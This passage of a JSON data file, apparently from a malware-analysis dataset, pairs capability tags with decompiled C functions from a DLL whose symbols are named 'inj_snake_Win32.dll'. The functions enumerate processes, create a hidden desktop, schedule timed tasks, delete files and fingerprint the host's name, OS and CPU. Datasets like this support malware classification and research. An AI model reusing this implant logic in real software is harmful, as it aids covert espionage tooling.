= *0x20046e24;\n            *0x20046e24 = ppiVar2;\n            fcn.2000157d(0x20046e28);\n            iVar1 = sym.inj_snake_Win32.dll_tr_read_pipe(arg_8h);\n            while (iVar1 == 0) {\n                sym.inj_snake_Win32.dll_tr_free(arg_8h, var_4h, 0);\n                iVar1 = sym.inj_snake_Win32.dll_tr_read_pipe(arg_8h);\n            }\n            arg_20h = NULL;\n            if (ppiVar2[3] != NULL) {\n                ppiVar6 = ppiVar2 + 6;\n                do {\n                    if (*ppiVar6 != NULL) {\n                        sym.inj_snake_Win32.dll_t_close(ppiVar6, 0);\n                    }\n                    arg_20h = arg_20h + 1;\n                    ppiVar6 = ppiVar6 + 3;\n                } while (arg_20h < ppiVar2[3]);\n            }\n            fcn.20001567(0x20046e28);\n            if (ppiVar2[1] == NULL) {\n                *0x20046e24 = *ppiVar2;\n            }\n            else {\n                *ppiVar2[1] = *ppiVar2;\n            }\n            if (*ppiVar2 != NULL) {\n                (*ppiVar2)[1] = ppiVar2[1];\n            }\n            fcn.2000157d(0x20046e28);\n            (*_sym.imp.msvcrt.dll_free)(ppiVar2);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 859
    },
    "2000a361": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.2000a361(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    *arg_14h = 3;\n    uVar3 = fcn.20007c3b(&var_ch);\n    iVar6 = 0;\n    if (uVar3 == 0) {\n        iVar4 = sym.inj_snake_Win32.dll_qm_enum(var_ch, 3, &var_4h, &var_8h);\n        if (iVar4 == 0) {\n            sub.ntdll.dll_memset(&var_2ch, 0, 0x10);\n            var_2ch = 0x37;\n            var_28h = 2;\n            var_24h = 0x1b;\n            var_20h = 2;\n            sub.ntdll.dll_memset(&var_1ch, 0, 0x10);\n            pcVar2 = _sym.imp.msvcrt.dll_calloc;\n            var_18h = &var_2ch;\n            var_1ch = 2;\n            var_14h = var_4h;\n            var_10h = (*_sym.imp.msvcrt.dll_calloc)(var_4h, 4);\n            if (var_10h == 0) {\n                uVar3 = 0x21590004;\n            }\n            else {\n                arg_14h = NULL;\n                if (var_4h != 0) {\n                    do {\n                        iVar4 = arg_14h * 4;\n                        uVar5 = (*pcVar2)(var_1ch, 0x10);\n                        *(iVar4 + var_10h) = uVar5;\n                        if (*(var_10h + iVar4) != 0) {\n                            iVar1 = *(var_10h + iVar4);\n                            *(iVar1 + 4) = iVar1 + 8;\n                            **(iVar4 + var_10h) = 4;\n                            **(*(iVar4 + var_10h) + 4) = *(iVar6 + 0xc + var_8h);\n                            *(*(iVar4 + var_10h) + 0x14) = *(iVar4 + var_10h) + 0x18;\n                            *(*(iVar4 + var_10h) + 0x10) = 4;\n                            **(*(iVar4 + var_10h) + 0x14) = *(iVar6 + 0x30 + var_8h);\n                        }\n                        arg_14h = arg_14h + 1;\n                        iVar6 = iVar6 + 0x40;\n                    } while (arg_14h < var_4h);\n                }\n                uVar3 = sym.inj_snake_Win32.dll_code_result_tbl(&var_1ch, arg_18h, arg_1ch);\n            }\n            sym.inj_snake_Win32.dll_qm_free(var_8h);\n            pcVar2 = _sym.imp.msvcrt.dll_free;\n            uVar7 = 0;\n            if (var_10h != 0) {\n                if (var_14h != 0) {\n                    do {\n                        (*pcVar2)(*(var_10h + uVar7 * 4));\n                        uVar7 = uVar7 + 1;\n                    } while (uVar7 < var_14h);\n                }\n                (*pcVar2)(var_10h);\n            }\n        }\n        else {\n            uVar3 = iVar4 + 0x191U | 0x21590000;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 945
    },
    "2000a4d6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.2000a4d6(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint var_140h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    uint *var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar4 = 0;\n    var_4h = 0;\n    sub.ntdll.dll_memset(&var_14h, 0, 0x10);\n    *arg_14h = 3;\n    iVar2 = sym.inj_snake_Win32.dll_qm_enum(0xfffffffe, 8, &var_18h, &var_4h);\n    if (iVar2 == 0) {\n        sub.ntdll.dll_memset(&var_38h, 0, 0x20);\n        var_34h = 2;\n        var_1ch = 2;\n        var_10h = &var_38h;\n        var_38h = 0x37;\n        var_30h = 0x1f;\n        var_2ch = 200;\n        var_28h = 0x38;\n        var_24h = 3;\n        var_20h = 0x39;\n        var_14h = 4;\n        var_ch = var_18h;\n        var_8h = (*_sym.imp.msvcrt.dll_calloc)(var_18h, 4);\n        if (var_8h == 0) {\n            arg_14h = 0x21590004;\n        }\n        else {\n            arg_14h = NULL;\n            if (var_18h != 0) {\n                do {\n                    iVar2 = sym.inj_snake_Win32.dll_local_queue_read\n                                      (*(var_4h + iVar4 + 8), *(var_4h + iVar4 + 4), &var_140h, 0x104, &var_3ch, 1);\n                    if (iVar2 == 0) {\n                        iVar5 = arg_14h * 4;\n                        iVar2 = sub.ntdll.dll_strlen(&var_140h);\n                        uVar3 = (*_sym.imp.msvcrt.dll_malloc)(iVar2 + 1 + var_14h * 0x10);\n                        *(iVar5 + var_8h) = uVar3;\n                        if (*(var_8h + iVar5) != 0) {\n                            iVar2 = *(var_8h + iVar5);\n                            *(iVar2 + 4) = iVar2 + 8;\n                            **(iVar5 + var_8h) = 4;\n                            **(*(iVar5 + var_8h) + 4) = *(iVar4 + 0xc + var_4h);\n                            *(*(iVar5 + var_8h) + 0x14) = var_14h * 0x10 + *(iVar5 + var_8h);\n                            sub.ntdll.dll_strcpy(*(*(iVar5 + var_8h) + 0x14), &var_140h);\n                            iVar2 = sub.ntdll.dll_strlen(&var_140h);\n                            *(*(iVar5 + var_8h) + 0x10) = iVar2 + 1;\n                            *(*(iVar5 + var_8h) + 0x24) = *(iVar5 + var_8h) + 0x28;\n                            *(*(iVar5 + var_8h) + 0x20) = 4;\n                            **(*(iVar5 + var_8h) + 0x24) = *(iVar4 + 0x14 + var_4h);\n                            *(*(iVar5 + var_8h) + 0x34) = *(iVar5 + var_8h) + 0x38;\n                            *(*(iVar5 + var_8h) + 0x30) = 4;\n                            **(*(iVar5 + var_8h) + 0x34) = *(iVar4 + 0x18 + var_4h);\n                        }\n                    }\n                    arg_14h = arg_14h + 1;\n                    iVar4 = iVar4 + 0x40;\n                } while (arg_14h < var_18h);\n            }\n            arg_14h = sym.inj_snake_Win32.dll_code_result_tbl(&var_14h, arg_18h, arg_1ch);\n        }\n    }\n    else {\n        arg_14h = iVar2 + 0x191U | 0x21590000;\n    }\n    sym.inj_snake_Win32.dll_qm_free(var_4h);\n    pcVar1 = _sym.imp.msvcrt.dll_free;\n    if (var_8h != 0) {\n        uVar6 = 0;\n        if (var_ch != 0) {\n            do {\n                (*pcVar1)(*(var_8h + uVar6 * 4));\n                uVar6 = uVar6 + 1;\n            } while (uVar6 < var_ch);\n        }\n        (*pcVar1)(var_8h);\n    }\n    return arg_14h;\n}\n",
        "token_count": 1271
    },
    "2000a924": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.2000a924(uint arg_8h)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uint path;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_4h;\n    \n    fcn.20001567(0x20046e40);\n    iVar1 = sym.inj_snake_Win32.dll_qm_find_first(0xfffffffe, 8, &arg_8h, &var_44h);\n    if (iVar1 == 0) {\n        bVar2 = var_2ch == 0;\n        if (!bVar2) {\n            var_2ch = var_2ch + -1;\n            sym.inj_snake_Win32.dll_qm_set_param(var_44h, var_3ch, var_40h, 2, var_2ch);\n            bVar2 = var_2ch == 0;\n        }\n        if (bVar2) {\n            iVar1 = sym.inj_snake_Win32.dll_local_queue_read(var_3ch, var_40h, &path, 0x104, &var_4h, 1);\n            if (iVar1 == 0) {\n                if ((var_30h & 2) != 0) {\n                    fcn.2000a2a6(&path, arg_8h);\n                }\n                (*_sym.imp.msvcrt.dll__unlink)(&path);\n            }\n            sym.inj_snake_Win32.dll_qm_rm(var_44h, var_3ch, var_40h);\n        }\n    }\n    fcn.2000157d(0x20046e40);\n    return;\n}\n",
        "token_count": 405
    },
    "2000aa76": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.2000aa76(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    fcn.20001567(0x20046e40);\n    iVar1 = sym.inj_snake_Win32.dll_qm_enum(0xfffffffe, 8, &var_8h, &var_4h);\n    if ((iVar1 == 0) && (uVar3 = 0,  var_8h != 0)) {\n        iVar1 = 0;\n        do {\n            if (arg_8h != 0) {\n                puVar2 = var_4h + iVar1;\n                sym.inj_snake_Win32.dll_qm_set_param(*puVar2, puVar2[2], puVar2[1], 2, 0);\n            }\n            fcn.2000a924(*(iVar1 + 0xc + var_4h));\n            uVar3 = uVar3 + 1;\n            iVar1 = iVar1 + 0x40;\n        } while (uVar3 < var_8h);\n    }\n    fcn.2000157d(0x20046e40);\n    sym.inj_snake_Win32.dll_qm_free(var_4h);\n    return;\n}\n",
        "token_count": 321
    },
    "2000ac52": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2000ac52(int16_t *arg_8h, int16_t *arg_ch, int32_t arg_10h, int32_t *arg_14h, uint *arg_18h)\n\n{\n    int16_t iVar1;\n    int16_t *arg_ch_00;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint s;\n    uint var_114h;\n    uint var_10h;\n    int16_t *endptr;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (((arg_ch == NULL) || (arg_14h == NULL)) || (arg_18h == NULL)) {\n        var_4h = 0x21590008;\n    }\n    else if (arg_8h == NULL) {\n        *arg_ch = 0;\n        *arg_14h = 0;\n        *arg_18h = 0;\n        var_4h = 0;\n    }\n    else {\n        *0x20046e58 = *0x20046e58 + 1;\n        *arg_14h = *0x20046e58;\n        *arg_18h = 0;\n        iVar1 = *arg_8h;\n        var_4h = 0;\n        var_8h = 0;\n        arg_ch_00 = arg_ch;\n        while (arg_ch = arg_ch_00,  iVar1 != 0) {\n            if ((iVar1 == 0x25) && (((iVar1 = arg_8h[1],  iVar1 == 0x3c || (iVar1 == 0x3e)) || (iVar1 == 0x7c)))) {\n                iVar2 = (*_sym.imp.ntdll.dll_isdigit)(arg_8h[2]);\n                if (iVar2 == 0) goto code_r0x2000ae1e;\n                var_10h = (*_sym.imp.ntdll.dll_wcstoul)(arg_8h + 2, &endptr, 0);\n                if (arg_8h[1] == 0x3c) {\n                    var_4h = 1;\n                }\n                else if (arg_8h[1] == 0x3e) {\n                    var_4h = 2;\n                }\n                else {\n                    var_4h = 3;\n                }\n                arg_8h = endptr;\n                if (*endptr == 0x3a) {\n                    uVar4 = 0;\n                    while( true ) {\n                        arg_8h = arg_8h + 1;\n                        if (((*arg_8h == 0) || (iVar2 = (*_sym.imp.ntdll.dll_isspace)(*arg_8h),  iVar2 != 0)) ||\n                           (0x102 < uVar4)) break;\n                        *(&var_114h + uVar4) = *arg_8h;\n                        uVar4 = uVar4 + 1;\n                    }\n                    *(&var_114h + uVar4) = 0;\n                }\n                else {\n                    var_114h._0_1_ = '\\0';\n                }\n                var_4h = fcn.2000a70f(var_10h, *arg_14h, var_4h, -(var_114h != '\\0') & &var_114h, &s);\n                if (var_4h != 0) break;\n                iVar3 = sub.ntdll.dll_strlen(&s);\n                iVar2 = var_8h;\n                if (arg_10h + -1 <= iVar3 + var_8h) goto code_r0x2000ae47;\n                fcn.20001d99(&s, arg_ch_00, arg_10h - var_8h, 0x200471e0);\n                iVar3 = fcn.20001fa5(&s, 0x200471e0);\n                arg_ch = arg_ch_00 + iVar3 + -1;\n                var_8h = fcn.20001fa5(&s, 0x200471e0);\n                var_8h = iVar2 + -1 + var_8h;\n                *arg_18h = 1;\n            }\n            else {\ncode_r0x2000ae1e:\n                arg_ch = arg_ch_00 + 1;\n                *arg_ch_00 = *arg_8h;\n                arg_8h = arg_8h + 1;\n                var_8h = var_8h + 1;\n                if (arg_10h + -1 <= var_8h) {\ncode_r0x2000ae47:\n                    var_4h = 0x21590064;\n                    break;\n                }\n            }\n            arg_ch_00 = arg_ch;\n            iVar1 = *arg_8h;\n        }\n        *arg_ch = 0;\n        if (var_4h != 0) {\n            fcn.2000a9d9(*arg_14h);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 1125
    },
    "2000b3ce": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.2000b3ce(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint var_28h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    int32_t *var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    (*_sym.imp.msvcrt.dll__time64)(&var_28h);\n    piVar3 = (*_sym.imp.msvcrt.dll__localtime64)(&var_28h);\n    uVar8 = (((0x18 - piVar3[2]) * 0x3c - piVar3[1]) * 0x3c - *piVar3) * 1000;\n    var_18h = piVar3;\n    var_ch = uVar8;\n    var_14h = sym.inj_snake_Win32.dll_qm_enum(0xfffffffe, 6, &var_1ch, &var_10h);\n    if (var_14h == 0) {\n        uVar4 = var_14h;\n        if (var_1ch != 0) {\n            do {\n                var_8h = uVar4;\n                iVar1 = var_8h + var_10h;\n                var_1h._0_1_ = *(iVar1 + 0x10);\n                if ((((*(iVar1 + 0x12) < 0x18) && (*(iVar1 + 0x11) < 0x3c)) && (var_1h != '\\0')) &&\n                   (*(iVar1 + 0x14) != 0)) {\n                    if (((*(iVar1 + 0x14) & 1 << (piVar3[3] & 0x1f)) != 0) &&\n                       ((*(iVar1 + 0x10) & 1 << (piVar3[6] & 0x1f)) != 0)) {\n                        var_20h = *piVar3;\n                        iVar2 = piVar3[2];\n                        uVar6 = *(iVar1 + 0x11);\n                        uVar4 = *(iVar1 + 0x12);\n                        iVar9 = (iVar2 * 0x3c + piVar3[1]) * 0x3c + var_20h;\n                        iVar7 = (uVar4 * 0x3c + uVar6) * 0x3c;\n                        uVar8 = var_ch;\n                        piVar3 = var_18h;\n                        if (iVar7 - iVar9 == 0 || iVar7 < iVar9) {\n                            if (((((iVar2 - uVar4) * 0x3c - uVar6) + var_18h[1]) * 0x3c + *var_18h) * 1000 < 0x493e1) {\n                                fcn.2000b306(*(iVar1 + 0xc), *(iVar1 + 4), *(iVar1 + 0x30));\n                                puVar5 = var_10h + var_8h;\n                                sym.inj_snake_Win32.dll_qm_rm(*puVar5, puVar5[2], puVar5[1]);\n                                uVar8 = var_ch;\n                            }\n                        }\n                        else {\n                            uVar4 = ((((uVar4 - iVar2) * 0x3c - var_18h[1]) + uVar6) * 0x3c - *var_18h) * 1000;\n                            if (uVar4 < var_ch) {\n                                uVar8 = uVar4;\n                                var_ch = uVar4;\n                            }\n                        }\n                    }\n                }\n                else if (arg_8h != 0) {\n                    fcn.2000b306(*(iVar1 + 0xc), *(iVar1 + 4), *(iVar1 + 0x30));\n                    puVar5 = var_10h + var_8h;\n                    sym.inj_snake_Win32.dll_qm_rm(*puVar5, puVar5[2], puVar5[1]);\n                }\n                var_14h = var_14h + 1;\n                var_8h = var_8h + 0x40;\n                uVar4 = var_8h;\n            } while (var_14h < var_1ch);\n        }\n        sym.inj_snake_Win32.dll_qm_free(var_10h);\n    }\n    return uVar8;\n}\n",
        "token_count": 1103
    },
    "2000bc26": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.2000bc26(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    char *s_00;\n    uint uVar5;\n    uint *arg_10h;\n    uint arg_10h_00;\n    uint lpVersionInformation;\n    uint32_t var_124h;\n    int32_t var_118h;\n    uint s;\n    uint var_10h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    lpVersionInformation = 0x114;\n    (*_sym.imp.KERNEL32.dll_GetVersionExW)(&lpVersionInformation);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    *0x2004716c = var_118h == 1;\n    if ((*0x2004716c == 0) && (var_124h < 5)) {\n        *0x20047168 = 1;\ncode_r0x2000bc87:\n        uVar5 = 0x20046e6c;\n        s_00 = \"psapi.dll\";\n        uVar3 = fcn.2000d8cc();\n        iVar4 = fcn.2000df70(uVar3, s_00, uVar5);\n        if (iVar4 != 0) {\n            return iVar4;\n        }\n        *0x20046e74 = (*pcVar1)(*0x20046e6c, \"EnumProcesses\");\n        if ((((*0x20046e74 == 0) || (*0x20046e78 = (*pcVar1)(*0x20046e6c, \"EnumProcessModules\"),  *0x20046e78 == 0)) ||\n            (*0x20046e7c = (*pcVar1)(*0x20046e6c, \"GetModuleBaseNameW\"),  *0x20046e7c == 0)) ||\n           (*0x20046e80 = (*pcVar1)(*0x20046e6c, \"GetModuleFileNameExW\"), \n           pcVar2 = _sym.imp.KERNEL32.dll_GetCurrentProcessId,  *0x20046e80 == 0)) goto code_r0x2000bcbd;\n        arg_10h = &var_8h;\n        uVar3 = *0x20046e6c;\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        iVar4 = fcn.2000f1b4(uVar5, uVar3, arg_10h);\n        if ((iVar4 != 0) || (var_8h == 1)) {\n            arg_10h_00 = 0x20046e70;\n            uVar3 = *0x20046e6c;\n            uVar5 = (*pcVar2)();\n            fcn.2000ec72(uVar5, uVar3, arg_10h_00);\n        }\n        if ((*0x2004716c != 0) || (*0x20047168 == 0)) goto code_r0x2000bd55;\n    }\n    else {\n        *0x20047168 = 0;\n        if (*0x2004716c == 0) goto code_r0x2000bc87;\ncode_r0x2000bd55:\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(L\"kernel32.dll\");\n        if ((iVar4 == 0) ||\n           (((*0x20046e84 = (*pcVar1)(iVar4, \"CreateToolhelp32Snapshot\"),  *0x20046e84 == 0 ||\n             (*0x20046e88 = (*pcVar1)(iVar4, \"Process32FirstW\"),  *0x20046e88 == 0)) ||\n            (*0x20046e8c = (*pcVar1)(iVar4, \"Process32NextW\"),  *0x20046e8c == 0)))) goto code_r0x2000bcbd;\n        if (*0x2004716c != 0) {\n            *0x20046e90 = (*pcVar1)(iVar4, \"RegisterServiceProcess\");\n            if (*0x20046e90 == 0) goto code_r0x2000bcbd;\n            if (*0x2004716c != 0) {\n                return 0;\n            }\n        }\n    }\n    var_4h = 0;\n    iVar4 = fcn.20001ac0(&var_4h);\n    if (iVar4 != 0) {\n        return -1;\n    }\n    sub.ntdll.dll_memset(&s, 0, 0xc);\n    var_10h = var_4h;\n    s = 0xc;\n    *0x20046e68 = (*_sym.imp.USER32.dll_CreateDesktopW)\n                            (L\"{a1d3d2d3-af20-4317-903f-78271c44b294}\", 0, 0, 0, 0x10000000, &s);\n    fcn.20001bcd(var_4h);\n    if (*0x20046e68 != 0) {\n        return 0;\n    }\ncode_r0x2000bcbd:\n    iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    return iVar4;\n}\n",
        "token_count": 1182
    },
    "2000be36": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.2000be36(void)\n\n{\n    uint uVar1;\n    int32_t arg_ch;\n    uint uVar2;\n    \n    if (*0x20046e6c != 0) {\n        uVar2 = 0x20046e70;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        fcn.2000ef7a(uVar1, uVar2);\n        uVar2 = 1;\n        arg_ch = *0x20046e6c;\n        uVar1 = fcn.2000d8cc();\n        fcn.20011537(uVar1, arg_ch, uVar2);\n    }\n    if (*0x20046e68 != 0) {\n        (*_sym.imp.USER32.dll_CloseDesktop)(*0x20046e68);\n    }\n    return;\n}\n",
        "token_count": 188
    },
    "2000bf45": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.2000bf45(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    code *pcVar3;\n    char *pcVar4;\n    uint var_46ch;\n    uint var_3a4h;\n    uint var_3a0h;\n    uint var_39ch;\n    int32_t var_394h;\n    uint var_390h;\n    uint var_290h;\n    uint var_22ch;\n    uint var_1c8h;\n    uint var_164h;\n    uint var_130h;\n    int32_t var_fch;\n    uint *var_f8h;\n    int32_t var_ech;\n    uint *var_e8h;\n    int32_t var_dch;\n    uint *var_d8h;\n    int32_t var_cch;\n    uint *var_c8h;\n    int32_t var_bch;\n    uint *var_b8h;\n    int32_t var_ach;\n    uint *var_a8h;\n    int32_t var_9ch;\n    uint var_98h;\n    uint var_8ch;\n    char16_t *var_88h;\n    uint var_7ch;\n    uint var_68h;\n    ushort var_5ch;\n    ushort var_5ah;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint *var_14h;\n    uint var_10h;\n    uint *var_ch;\n    int32_t var_8h;\n    uint *var_4h;\n    \n    *arg_14h = 3;\n    arg_14h = 0x64;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetComputerNameW)(&var_46ch, &arg_14h);\n    if (iVar1 == 0) {\ncode_r0x2000bf73:\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n        return;\n    }\n    var_3a4h = 0x114;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetVersionExW)(&var_3a4h);\n    if (iVar1 == 0) goto code_r0x2000bf73;\n    if (var_394h == 0) {\n        pcVar4 = \"Win32s\";\ncode_r0x2000bfdd:\n        sub.ntdll.dll_strcpy(&var_1c8h, pcVar4);\n    }\n    else {\n        if (var_394h == 1) {\n            pcVar4 = \"Win9x\";\n            goto code_r0x2000bfdd;\n        }\n        if (var_394h == 2) {\n            pcVar4 = \"WinNT\";\n            goto code_r0x2000bfdd;\n        }\n        (*_sym.imp.ntdll.dll_sprintf)(&var_1c8h, \"Win(%u)\", var_394h);\n    }\n    sub.ntdll.dll_strcpy(&var_164h, \"(32 on 32)\");\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(L\"kernel32.dll\");\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (iVar1 == 0) {\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n        return;\n    }\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"GetNativeSystemInfo\");\n    if (pcVar2 == NULL) {\n        pcVar2 = (*pcVar3)(iVar1, \"GetSystemInfo\");\n    }\n    pcVar3 = (*pcVar3)(iVar1, \"IsWow64Process\");\n    if (((pcVar3 != NULL) && (iVar1 = (*pcVar3)(0xffffffff, &var_8h),  iVar1 != 0)) && (var_8h != 0)) {\n        sub.ntdll.dll_strcpy(&var_1c8h, \"Win64\");\n        sub.ntdll.dll_strcpy(&var_164h, \"(32 on 64)\");\n    }\n    sub.ntdll.dll_strcat(&var_164h, \" unicode\");\n    (*pcVar2)(&var_7ch);\n    if (var_7ch == 0) {\n        pcVar4 = \"Intel\";\n    }\n    else if (var_7ch == 6) {\n        pcVar4 = \"IA64\";\n    }\n    else {\n        if (var_7ch != 9) {\n            (*_sym.imp.ntdll.dll_sprintf)(&var_130h, \"(%u)\", var_7ch);\n            goto code_r0x2000c0dc;\n        }\n        pcVar4 = \"AMD64\";\n    }\n    sub.ntdll.dll_strcpy(&var_130h, pcVar4);\ncode_r0x2000c0dc:\n    sub.ntdll.dll_memset(&var_18h, 0, 0x10);\n    pcVar3 = _sym.imp.KERNEL32.dll_lstrlenW;\n    var_14h = &var_58h;\n    var_4h = &var_fch;\n    var_ch = &var_4h;\n    var_f8h = &var_46ch;\n    var_18h = 8;\n    var_10h = 1;\n    var_58h = 9;\n    var_54h = 4;\n    iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(var_f8h);\n    var_fch = iVar1 * 2 + 2;\n    var_e8h = &var_1c8h;\n    var_50h = 10;\n    var_4ch = 200;\n    var_ech = sub.ntdll.dll_strlen(var_e8h);\n    var_ech = var_ech + 1;\n    var_48h = 0xb;\n    var_44h = 200;\n    (*_sym.imp.ntdll.dll_sprintf)(&var_22ch, \"%u.%u\", var_3a0h, var_39ch);\n    var_d8h = &var_22ch;\n    var_dch = sub.ntdll.dll_strlen(var_d8h);\n    var_dch = var_dch + 1;\n    var_c8h = &var_390h;\n    var_40h = 0xc;\n    var_3ch = 4;\n    iVar1 = (*pcVar3)(var_c8h);\n    var_cch = iVar1 * 2 + 2;\n    var_38h = 0xd;\n    var_34h = 200;\n    (*_sym.imp.ntdll.dll_sprintf)(&var_290h, \"%s %u.%04x (CPU#: %u)\", &var_130h, var_5ch, var_5ah, var_68h);\n    var_b8h = &var_290h;\n    var_bch = sub.ntdll.dll_strlen(var_b8h);\n    var_bch = var_bch + 1;\n    var_a8h = &var_164h;\n    var_30h = 0x4c;\n    var_2ch = 200;\n    var_ach = sub.ntdll.dll_strlen(var_a8h);\n    var_ach = var_ach + 1;\n    var_28h = 0x5c;\n    var_24h = 200;\n    var_98h = (*_sym.imp.msvcrt.dll_setlocale)(0, 0x200471e0);\n    var_9ch = sub.ntdll.dll_strlen(var_98h);\n    var_9ch = var_9ch + 1;\n    var_20h = 0x88;\n    var_1ch = 4;\n    var_88h = L\":rn:21107\";\n    var_8ch = 0x14;\n    sym.inj_snake_Win32.dll_code_result_tbl(&var_18h, arg_18h, arg_1ch);\n    return;\n}\n",
        "token_count": 1883
    },
    "2000c291": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
